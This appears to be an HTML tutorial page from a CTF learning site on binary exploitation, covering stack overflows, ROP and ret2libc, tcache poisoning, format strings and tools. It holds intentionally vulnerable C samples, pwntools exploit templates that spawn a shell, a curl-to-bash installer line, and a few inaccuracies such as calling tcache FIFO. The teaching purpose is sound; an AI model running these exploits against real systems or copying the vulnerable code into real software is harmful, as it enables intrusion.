@@ -1,0 +1,1013 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Binary Exploitation | CTF Learning Hub</title>
+    <style>
+        body {
+            background-color: #121212;
+            color: #f8f8f8;
+            font-family: 'Courier New', Courier, monospace;
+            margin: 0;
+            padding: 0;
+            line-height: 1.6;
+        }
+        .container {
+            width: 85%;
+            margin: 0 auto;
+            padding: 20px 0;
+        }
+        header {
+            border-bottom: 3px solid #ff9800;
+            padding-bottom: 20px;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+        h1 {
+            color: #ff9800;
+            text-transform: uppercase;
+        }
+        h2 {
+            color: #4caf50;
+            border-left: 4px solid #4caf50;
+            padding-left: 10px;
+            margin-top: 40px;
+            cursor: pointer;
+        }
+        h2::before {
+            content: "+ ";
+            color: #ff9800;
+        }
+        h2.active::before {
+            content: "- ";
+        }
+        h3 {
+            color: #2196f3;
+        }
+        .card {
+            background-color: #1e1e1e;
+            border: 1px solid #333;
+            border-radius: 5px;
+            padding: 15px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.3);
+        }
+        .vuln-section {
+            display: none;
+            animation: fadeIn 0.5s;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        .code-block {
+            background-color: #2d2d2d;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            font-family: 'Courier New', Courier, monospace;
+            margin: 15px 0;
+            border-left: 3px solid #ff9800;
+            white-space: pre-wrap;
+            word-break: break-all;
+            tab-size: 4;
+        }
+        .note {
+            background-color: #33322d;
+            border-left: 4px solid #ffd700;
+            padding: 10px;
+            margin: 15px 0;
+        }
+        .warning {
+            background-color: #3a1d1d;
+            border-left: 4px solid #f44336;
+            padding: 10px;
+            margin: 15px 0;
+        }
+        .tool {
+            background-color: #1e2b3a;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+        a {
+            color: #ff9800;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        nav {
+            margin: 20px 0;
+        }
+        nav a {
+            margin-right: 15px;
+            padding: 5px 10px;
+            border: 1px solid #ff9800;
+            border-radius: 3px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+        th, td {
+            border: 1px solid #444;
+            padding: 8px;
+            text-align: left;
+        }
+        th {
+            background-color: #333;
+        }
+        tr:nth-child(even) {
+            background-color: #1e1e1e;
+        }
+        .sub-topic {
+            margin-left: 20px;
+            border-left: 2px solid #444;
+            padding-left: 15px;
+        }
+        .payload-list {
+            columns: 3;
+            column-gap: 20px;
+        }
+        .payload-item {
+            break-inside: avoid;
+            margin-bottom: 10px;
+        }
+        .show-more {
+            color: #ff9800;
+            cursor: pointer;
+            text-decoration: underline;
+            margin: 10px 0;
+            display: inline-block;
+        }
+        .more-payloads {
+            display: none;
+        }
+        .tool-name {
+            color: #4caf50;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+        .tool-details {
+            display: none;
+            margin-top: 10px;
+        }
+        .vulnerable-code {
+            background-color: #3a1d1d;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            border-left: 3px solid #f44336;
+        }
+        .linux-option {
+            color: #2196f3;
+            cursor: pointer;
+            text-decoration: underline;
+            margin-right: 15px;
+        }
+        .linux-install {
+            display: none;
+            margin-top: 10px;
+        }
+        .asm-examples {
+            background-color: #1e2b3a;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            border-left: 3px solid #2196f3;
+        }
+        .register {
+            color: #ff9800;
+            font-weight: bold;
+        }
+        .ctf-tip {
+            background-color: #2d1e3a;
+            border-left: 4px solid #9c27b0;
+            padding: 10px;
+            margin: 15px 0;
+        }
+        .flag-format {
+            font-family: 'Courier New', Courier, monospace;
+            color: #ff9800;
+            background-color: #2d2d2d;
+            padding: 2px 5px;
+            border-radius: 3px;
+        }
+        .memory-layout {
+            background-color: #1e2b3a;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            border-left: 3px solid #ff9800;
+            font-family: monospace;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Binary Exploitation</h1>
+            <p>Master memory corruption vulnerabilities and exploit development</p>
+            <nav>
+                <a href="ctf.html">Home</a>
+                <a href="#" class="nav-link" data-section="intro">Introduction</a>
+                <a href="#" class="nav-link" data-section="stack">Stack Overflows</a>
+                <a href="#" class="nav-link" data-section="rop">ROP Chains</a>
+                <a href="#" class="nav-link" data-section="heap">Heap Exploitation</a>
+                <a href="#" class="nav-link" data-section="format">Format Strings</a>
+                <a href="#" class="nav-link" data-section="tools">Tools</a>
+                <a href="#" class="nav-link" data-section="ctf-tips">CTF Tips</a>
+            </nav>
+        </header>
+
+        <section id="intro">
+            <div class="card">
+                <h2>Introduction to Binary Exploitation</h2>
+                <div class="vuln-section">
+                    <p>Binary exploitation involves finding and exploiting memory corruption vulnerabilities in compiled programs.</p>
+                    
+                    <div class="sub-topic">
+                        <h3>Memory Layout</h3>
+                        <div class="memory-layout">
+                            High Addresses
+                            ┌─────────────────┐
+                            │      Stack      │ ← Grows downward
+                            ├─────────────────┤
+                            │       ↓         │
+                            │                 │
+                            │       ↑         │
+                            ├─────────────────┤
+                            │      Heap       │ ← Grows upward
+                            ├─────────────────┤
+                            │    .bss (BSS)   │ ← Uninitialized data
+                            ├─────────────────┤
+                            │    .data        │ ← Initialized data
+                            ├─────────────────┤
+                            │    .text        │ ← Code
+                            └─────────────────┘
+                            Low Addresses
+                        </div>
+                    </div>
+                    
+                    <div class="sub-topic">
+                        <h3>Common Vulnerabilities</h3>
+                        <ul>
+                            <li>Buffer overflows (stack and heap)</li>
+                            <li>Format string vulnerabilities</li>
+                            <li>Use-after-free</li>
+                            <li>Double free</li>
+                            <li>Integer overflows</li>
+                            <li>Race conditions</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="sub-topic">
+                        <h3>Protection Mechanisms</h3>
+                        <table>
+                            <tr>
+                                <th>Protection</th>
+                                <th>Description</th>
+                                <th>Bypass Techniques</th>
+                            </tr>
+                            <tr>
+                                <td>NX/DEP</td>
+                                <td>Prevents code execution from data segments</td>
+                                <td>ROP, ret2libc</td>
+                            </tr>
+                            <tr>
+                                <td>ASLR</td>
+                                <td>Randomizes memory addresses</td>
+                                <td>Bruteforce, leaks</td>
+                            </tr>
+                            <tr>
+                                <td>Stack Canaries</td>
+                                <td>Detects stack buffer overflows</td>
+                                <td>Leaking, overwriting</td>
+                            </tr>
+                            <tr>
+                                <td>RELRO</td>
+                                <td>Protects GOT overwrites</td>
+                                <td>Partial RELRO bypass</td>
+                            </tr>
+                        </table>
+                    </div>
+                    
+                    <div class="ctf-tip">
+                        <strong>CTF Tip:</strong> Always check binary protections first:
+                        <div class="code-block">
+checksec --file=./binary
+                        </div>
+                        Common tools for binary analysis:
+                        <span class="flag-format">objdump</span>, 
+                        <span class="flag-format">readelf</span>, 
+                        <span class="flag-format">gdb</span>, 
+                        <span class="flag-format">radare2</span>, 
+                        <span class="flag-format">Ghidra</span>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="stack">
+            <div class="card">
+                <h2>Stack-Based Buffer Overflows</h2>
+                <div class="vuln-section">
+                    <p>Occur when a program writes more data to a buffer on the stack than it can hold.</p>
+                    
+                    <div class="sub-topic">
+                        <h3>Vulnerable C Code Example</h3>
+                        <div class="vulnerable-code">
+                            <div class="code-block">
+// vuln.c
+#include <stdio.h>
+#include <string.h>
+
+void vulnerable_function(char *input) {
+    char buffer[64];
+    strcpy(buffer, input); // No bounds checking!
+}
+
+int main(int argc, char **argv) {
+    vulnerable_function(argv[1]);
+    return 0;
+}
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="sub-topic">
+                        <h3>Exploitation Steps</h3>
+                        <div class="code-block">
+# 1. Find the offset to EIP/RIP
+gdb ./vuln
+(gdb) pattern create 100
+(gdb) run $(python -c 'print "Aa0Aa1Aa2..."')
+(gdb) info registers eip
+
+# 2. Confirm control of EIP
+./vuln $(python -c 'print "A"*72 + "BBBB"')
+
+# 3. Find bad characters
+\x00\x0a\x0d\xff  # Common bad chars
+
+# 4. Find return address (JMP ESP)
+objdump -d ./vuln | grep "ff e4"  # JMP ESP
+
+# 5. Craft exploit with shellcode
+./vuln $(python -c 'print "A"*72 + "\xef\xbe\xad\xde" + "\x90"*16 + shellcode')
+                        </div>
+                    </div>
+                    
+                    <div class="sub-topic">
+                        <h3>64-bit vs 32-bit Differences</h3>
+                        <table>
+                            <tr>
+                                <th>Aspect</th>
+                                <th>32-bit</th>
+                                <th>64-bit</th>
+                            </tr>
+                            <tr>
+                                <td>Register Names</td>
+                                <td>EIP, ESP, EBP</td>
+                                <td>RIP, RSP, RBP</td>
+                            </tr>
+                            <tr>
+                                <td>Function Args</td>
+                                <td>On stack</td>
+                                <td>Registers (RDI, RSI, RDX...)</td>
+                            </tr>
+                            <tr>
+                                <td>Address Size</td>
+                                <td>4 bytes</td>
+                                <td>8 bytes</td>
+                            </tr>
+                        </table>
+                    </div>
+                    
+                    <div class="tool">
+                        <h3>Exploit Development Tools</h3>
+                        <p><span class="tool-name">pwntools</span> - CTF framework for writing exploits</p>
+                        <div class="tool-details" id="pwntools-details">
+                            <div class="code-block">
+# Basic pwntools template
+from pwn import *
+
+context.binary = './vuln'
+p = process('./vuln')
+
+offset = 72
+jmp_esp = 0xdeadbeef
+shellcode = asm(shellcraft.sh())
+
+payload = flat({
+    offset: jmp_esp,
+    offset+4: shellcode
+})
+
+p.sendline(payload)
+p.interactive()
+                            </div>
+                            <div class="linux-option" data-target="pwntools-kali">Kali Linux</div>
+                            <div class="linux-option" data-target="pwntools-manual">Manual Install</div>
+                            
+                            <div class="linux-install" id="pwntools-kali">
+                                <div class="code-block">
+# Kali Linux installation
+sudo apt update && sudo apt install python3-pwntools
+                                </div>
+                            </div>
+                            
+                            <div class="linux-install" id="pwntools-manual">
+                                <div class="code-block">
+# Manual installation
+pip install pwntools
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="ctf-tip">
+                        <strong>CTF Tip:</strong> For stack overflows:
+                        <ul>
+                            <li>Find exact offset with pattern_create/pattern_offset</li>
+                            <li>Check for bad characters (especially null bytes)</li>
+                            <li>Use NOP sleds (\x90) for reliability</li>
+                            <li>If NX is enabled, use ROP or ret2libc</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="rop">
+            <div class="card">
+                <h2>Return-Oriented Programming (ROP)</h2>
+                <div class="vuln-section">
+                    <p>ROP allows code execution by chaining together small instruction sequences ("gadgets") already present in the binary.</p>
+                    
+                    <div class="sub-topic">
+                        <h3>ROP Chain Components</h3>
+                        <ul>
+                            <li><span class="register">POP RET</span> gadgets - For argument setup</li>
+                            <li><span class="register">MOV</span> gadgets - For register manipulation</li>
+                            <li>Function calls - Especially system() or execve()</li>
+                            <li>String constants - Like "/bin/sh"</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="sub-topic">
+                        <h3>Finding Gadgets</h3>
+                        <div class="code-block">
+# Using ROPgadget
+ROPgadget --binary ./vuln | grep "pop rdi"
+
+# Using ropper
+ropper --file ./vuln --search "pop rdi"
+
+# Using pwntools
+elf = ELF('./vuln')
+rop = ROP(elf)
+rop.raw(0xdeadbeef)  # Direct address
+rop.call('system', [next(elf.search(b'/bin/sh'))])
+                        </div>
+                    </div>
+                    
+                    <div class="sub-topic">
+                        <h3>ret2libc Example</h3>
+                        <div class="code-block">
+# 1. Leak libc address
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+main = elf.symbols['main']
+
+payload = flat({
+    offset: [
+        pop_rdi,
+        puts_got,
+        puts_plt,
+        main
+    ]
+})
+
+# 2. Calculate libc base
+puts_leak = u64(p.recv(6).ljust(8, b'\x00'))
+libc.address = puts_leak - libc.symbols['puts']
+
+# 3. Get shell
+system = libc.symbols['system']
+bin_sh = next(libc.search(b'/bin/sh'))
+
+payload = flat({
+    offset: [
+        pop_rdi,
+        bin_sh,
+        system
+    ]
+})
+                        </div>
+                    </div>
+                    
+                    <div class="sub-topic">
+                        <h3>Common ROP Techniques</h3>
+                        <table>
+                            <tr>
+                                <th>Technique</th>
+                                <th>Description</th>
+                                <th>Use Case</th>
+                            </tr>
+                            <tr>
+                                <td>ret2libc</td>
+                                <td>Return to libc functions</td>
+                                <td>NX enabled, ASLR disabled</td>
+                            </tr>
+                            <tr>
+                                <td>ret2plt</td>
+                                <td>Return to PLT entries</td>
+                                <td>Partial RELRO</td>
+                            </tr>
+                            <tr>
+                                <td>ret2csu</td>
+                                <td>Use __libc_csu_init gadgets</td>
+                                <td>64-bit, limited gadgets</td>
+                            </tr>
+                            <tr>
+                                <td>SROP</td>
+                                <td>Sigreturn-oriented programming</td>
+                                <td>When sigreturn is available</td>
+                            </tr>
+                        </table>
+                    </div>
+                    
+                    <div class="ctf-tip">
+                        <strong>CTF Tip:</strong> For ROP challenges:
+                        <ul>
+                            <li>Find a way to leak addresses if ASLR is enabled</li>
+                            <li>Chain simple gadgets to achieve complex operations</li>
+                            <li>Use pwntools' ROP module for automation</li>
+                            <li>Remember 64-bit calling convention: RDI, RSI, RDX, RCX, R8, R9</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="heap">
+            <div class="card">
+                <h2>Heap Exploitation</h2>
+                <div class="vuln-section">
+                    <p>Heap exploitation involves manipulating dynamic memory allocation to achieve code execution.</p>
+                    
+                    <div class="sub-topic">
+                        <h3>Heap Basics</h3>
+                        <div class="memory-layout">
+                            chunk +--------+--------+--------+--------+
+                                 | prev_size | size |  fd   |  bk   |
+                                 +--------+--------+--------+--------+
+                                 |            data                   |
+                                 +--------+--------+--------+--------+
+                        </div>
+                        <ul>
+                            <li><span class="register">fd</span> - Forward pointer (next chunk in bin)</li>
+                            <li><span class="register">bk</span> - Backward pointer (prev chunk in bin)</li>
+                            <li>Size includes flags (PREV_INUSE, IS_MMAPPED, NON_MAIN_ARENA)</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="sub-topic">
+                        <h3>Common Heap Vulnerabilities</h3>
+                        <div class="code-block">
+# Use-after-free
+char *a = malloc(32);
+free(a);
+*a = 'A';  // UAF write
+
+# Double free
+char *a = malloc(32);
+free(a);
+free(a);  // Double free
+
+# Heap overflow
+char *a = malloc(32);
+strcpy(a, "A"*40);  // Overflow into next chunk
+                        </div>
+                    </div>
+                    
+                    <div class="sub-topic">
+                        <h3>Exploitation Techniques</h3>
+                        <table>
+                            <tr>
+                                <th>Technique</th>
+                                <th>Description</th>
+                                <th>Glibc Version</th>
+                            </tr>
+                            <tr>
+                                <td>fastbin dup</td>
+                                <td>Double free in fastbins</td>
+                                <td>All</td>
+                            </tr>
+                            <tr>
+                                <td>unsafe unlink</td>
+                                <td>Fake chunk unlinking</td>
+                                <td>< 2.26</td>
+                            </tr>
+                            <tr>
+                                <td>house of spirit</td>
+                                <td>Fake fastbin chunk</td>
+                                <td>All</td>
+                            </tr>
+                            <tr>
+                                <td>house of force</td>
+                                <td>Overwrite top chunk</td>
+                                <td>< 2.29</td>
+                            </tr>
+                            <tr>
+                                <td>tcache poisoning</td>
+                                <td>Overwrite tcache entries</td>
+                                <td>> 2.26</td>
+                            </tr>
+                        </table>
+                    </div>
+                    
+                    <div class="sub-topic">
+                        <h3>Example: tcache poisoning</h3>
+                        <div class="code-block">
+# Allocate two chunks
+a = malloc(0x28);
+b = malloc(0x28);
+
+# Free both to tcache
+free(a);
+free(b);
+
+# Overflow 'a' to modify 'b's fd pointer
+a[0x28/8] = (long)target_address;
+
+# malloc will return our target address
+malloc(0x28);
+malloc(0x28);  # Returns target_address
+                        </div>
+                    </div>
+                    
+                    <div class="tool">
+                        <h3>Heap Analysis Tools</h3>
+                        <p><span class="tool-name">gef</span> - GDB Enhanced Features for exploit dev</p>
+                        <div class="tool-details" id="gef-details">
+                            <div class="code-block">
+# Install gef
+bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
+
+# Heap commands in gef
+heap chunks      # View all chunks
+heap bins        # View all bins
+heap arenas      # View arenas
+                        </div>
+                        </div>
+                    </div>
+                    
+                    <div class="ctf-tip">
+                        <strong>CTF Tip:</strong> For heap challenges:
+                        <ul>
+                            <li>Check glibc version (ldd or strings)</li>
+                            <li>Visualize chunks with gef/pwndbg</li>
+                            <li>Look for UAF/double free vulnerabilities</li>
+                            <li>Remember tcache is FIFO while other bins are LIFO</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="format">
+            <div class="card">
+                <h2>Format String Vulnerabilities</h2>
+                <div class="vuln-section">
+                    <p>Occur when user input is passed directly to printf-family functions without proper formatting.</p>
+                    
+                    <div class="sub-topic">
+                        <h3>Vulnerable C Code Example</h3>
+                        <div class="vulnerable-code">
+                            <div class="code-block">
+// vuln.c
+#include <stdio.h>
+
+int main(int argc, char **argv) {
+    printf(argv[1]);  // User controls format string!
+    return 0;
+}
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="sub-topic">
+                        <h3>Exploitation Techniques</h3>
+                        <div class="code-block">
+# Leak stack values
+./vuln "%p.%p.%p.%p"
+
+# Leak specific argument (64-bit)
+./vuln "%7$p"  # 7th argument
+
+# Arbitrary read (32-bit)
+./vuln $(python -c 'print "\xef\xbe\xad\xde" + "%7$s"')
+
+# Arbitrary write (32-bit)
+./vuln $(python -c 'print "\xef\xbe\xad\xde" + "%48871x%7$n"')
+# Writes 0xbeef to 0xdeadbeef
+                        </div>
+                    </div>
+                    
+                    <div class="sub-topic">
+                        <h3>64-bit vs 32-bit Differences</h3>
+                        <table>
+                            <tr>
+                                <th>Aspect</th>
+                                <th>32-bit</th>
+                                <th>64-bit</th>
+                            </tr>
+                            <tr>
+                                <td>Argument Location</td>
+                                <td>On stack</td>
+                                <td>Registers then stack</td>
+                            </tr>
+                            <tr>
+                                <td>Pointer Size</td>
+                                <td>4 bytes</td>
+                                <td>8 bytes</td>
+                            </tr>
+                            <tr>
+                                <td>Common Offsets</td>
+                                <td>6-10</td>
+                                <td>6-10 in regs, higher on stack</td>
+                            </tr>
+                        </table>
+                    </div>
+                    
+                    <div class="sub-topic">
+                        <h3>Automated Exploitation</h3>
+                        <div class="code-block">
+from pwn import *
+
+context.binary = './vuln'
+p = process('./vuln')
+
+# Leak libc address
+payload = fmtstr_payload(7, {elf.got['puts']: elf.symbols['main']})
+p.sendline(payload)
+
+# Write to arbitrary address
+payload = fmtstr_payload(7, {0xdeadbeef: 0xcafebabe})
+p.sendline(payload)
+                        </div>
+                    </div>
+                    
+                    <div class="ctf-tip">
+                        <strong>CTF Tip:</strong> For format string challenges:
+                        <ul>
+                            <li>Find offset with %p or %lx (64-bit)</li>
+                            <li>Use %n for writes (but be careful with null bytes)</li>
+                            <li>Overwrite GOT entries if RELRO is partial</li>
+                            <li>Remember 64-bit args are in RDI, RSI, RDX, RCX, R8, R9 then stack</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="tools">
+            <div class="card">
+                <h2>Binary Exploitation Tools</h2>
+                <div class="vuln-section">
+                    <div class="tool">
+                        <h3>Debugging Tools</h3>
+                        <p><span class="tool-name">GDB</span> - GNU Debugger with enhancements</p>
+                        <div class="tool-details" id="gdb-details">
+                            <div class="code-block">
+# Basic GDB commands
+gdb ./binary
+(gdb) break *main
+(gdb) run
+(gdb) info registers
+(gdb) x/20wx $esp
+(gdb) continue
+                            </div>
+                        </div>
+                        
+                        <p><span class="tool-name">pwndbg/gef</span> - Enhanced GDB interfaces</p>
+                        <div class="tool-details" id="pwndbg-details">
+                            <div class="code-block">
+# Install pwndbg
+git clone https://github.com/pwndbg/pwndbg
+cd pwndbg
+./setup.sh
+
+# Useful commands
+telescope 20      # View stack memory
+heap              # Heap analysis
+rop --grep "pop rdi"
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="tool">
+                        <h3>Reverse Engineering</h3>
+                        <p><span class="tool-name">Ghidra</span> - NSA's open source reversing tool</p>
+                        <div class="tool-details" id="ghidra-details">
+                            <div class="code-block">
+# Install on Kali
+sudo apt update && sudo apt install ghidra
+                            </div>
+                        </div>
+                        
+                        <p><span class="tool-name">radare2</span> - Command-line reversing framework</p>
+                        <div class="tool-details" id="radare2-details">
+                            <div class="code-block">
+# Basic usage
+r2 -AAA ./binary
+> afl            # List functions
+> s main         # Seek to main
+> pdf            # Disassemble function
+> iz             # View strings
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="tool">
+                        <h3>Exploit Development</h3>
+                        <p><span class="tool-name">pwntools</span> - CTF framework for exploit development</p>
+                        <div class="tool-details" id="pwntools2-details">
+                            <div class="code-block">
+from pwn import *
+
+context.arch = 'amd64'
+shellcode = asm(shellcraft.sh())
+print(hexdump(shellcode))
+
+# ROP example
+elf = ELF('./binary')
+rop = ROP(elf)
+rop.call('system', [next(elf.search(b'/bin/sh'))])
+print(rop.dump())
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="ctf-tips">
+            <div class="card">
+                <h2>Binary Exploitation CTF Tips</h2>
+                <div class="vuln-section">
+                    <div class="sub-topic">
+                        <h3>General Strategy</h3>
+                        <ol>
+                            <li>Run <span class="flag-format">checksec</span> to identify protections</li>
+                            <li>Analyze with <span class="flag-format">ltrace/strace</span> for behavior</li>
+                            <li>Reverse engineer with <span class="flag-format">Ghidra/radare2</span></li>
+                            <li>Identify vulnerability type (overflow, UAF, etc)</li>
+                            <li>Develop exploit locally then adapt for remote</li>
+                        </ol>
+                    </div>
+                    
+                    <div class="sub-topic">
+                        <h3>Common Binary Types</h3>
+                        <table>
+                            <tr>
+                                <th>Binary Type</th>
+                                <th>Key Characteristics</th>
+                                <th>Tools</th>
+                            </tr>
+                            <tr>
+                                <td>Linux ELF</td>
+                                <td>checksec, GOT/PLT</td>
+                                <td>gdb, readelf</td>
+                            </tr>
+                            <tr>
+                                <td>Windows PE</td>
+                                <td>DLLs, SEH</td>
+                                <td>x64dbg, IDA</td>
+                            </tr>
+                            <tr>
+                                <td>ARM</td>
+                                <td>Different registers</td>
+                                <td>qemu-arm, gdb-multiarch</td>
+                            </tr>
+                        </table>
+                    </div>
+                    
+                    <div class="sub-topic">
+                        <h3>Quick Checks</h3>
+                        <ul>
+                            <li>Try large inputs for buffer overflows</li>
+                            <li>Check for format strings with %x/%p/%n</li>
+                            <li>Look for UAF with dangling pointers</li>
+                            <li>Test integer overflows with large values</li>
+                            <li>Check for command injection with ; or `</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="sub-topic">
+                        <h3>Useful Commands</h3>
+                        <div class="code-block">
+# Check binary protections
+checksec --file=./binary
+
+# View linked libraries
+ldd ./binary
+
+# Search for strings
+strings ./binary | grep -i flag
+
+# Disassemble function
+objdump -d ./binary -M intel | grep -A20 "<main>:"
+
+# Debug with gdb
+gdb -q ./binary -ex "break *main" -ex "run"
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <footer>
+            <p>CTF Learning Hub | Binary Exploitation Guide</p>
+            <p>Remember: Always test exploits locally before running against remote servers.</p>
+        </footer>
+    </div>
+
+    <script>
+        // Toggle sections when clicking headers
+        document.querySelectorAll('h2').forEach(header => {
+            header.addEventListener('click', () => {
+                header.classList.toggle('active');
+                const section = header.nextElementSibling;
+                section.style.display = section.style.display === 'block' ? 'none' : 'block';
+            });
+        });
+
+        // Navigation to sections
+        document.querySelectorAll('.nav-link').forEach(link => {
+            link.addEventListener('click', (e) => {
+                e.preventDefault();
+                const sectionId = link.getAttribute('data-section');
+                const section = document.getElementById(sectionId);
+                const header = section.querySelector('h2');
+                
+                // Close all sections
+                document.querySelectorAll('.vuln-section').forEach(sec => {
+                    sec.style.display = 'none';
+                });
+                document.querySelectorAll('h2').forEach(h => {
+                    h.classList.remove('active');
+                });
+                
+                // Open selected section
+                header.classList.add('active');
+                header.nextElementSibling.style.display = 'block';
+                section.scrollIntoView({ behavior: 'smooth' });
+            });
+        });
+
+        // Show more payloads
+        document.querySelectorAll('.show-more').forEach(button => {
+            button.addEventListener('click', () => {
+                const targetId = button.getAttribute('data-target');
+                const target = document.getElementById(targetId);
+                target.style.display = target.style.display === 'block' ? 'none' : 'block';
+                button.textContent = target.style.display === 'block' ? 'Show less' : 'Show more';
+            });
+        });
+
+        // Show tool details
+        document.querySelectorAll('.tool-name').forEach(tool => {
+            tool.addEventListener('click', () => {
+                const details = tool.parentNode.nextElementSibling;
+                details.style.display = details.style.display === 'block' ? 'none' : 'block';
+            });
+        });
+
+        // Show Linux installation options
+        document.querySelectorAll('.linux-option').forEach(option => {
+            option.addEventListener('click', () => {
+                const targetId = option.getAttribute('data-target');
+                const parent = option.parentNode;
+                
+                // Hide all installation methods in this tool
+                parent.querySelectorAll('.linux-install').forEach(install => {
+                    install.style.display = 'none';
+                });
+                
+                // Show selected installation method
+                document.getElementById(targetId).style.display = 'block';
+            });
+        });
+
+        // Open first section by default
+        document.querySelector('h2').classList.add('active');
+        document.querySelector('.vuln-section').style.display = 'block';
+    </script>
+</body>
+</html>
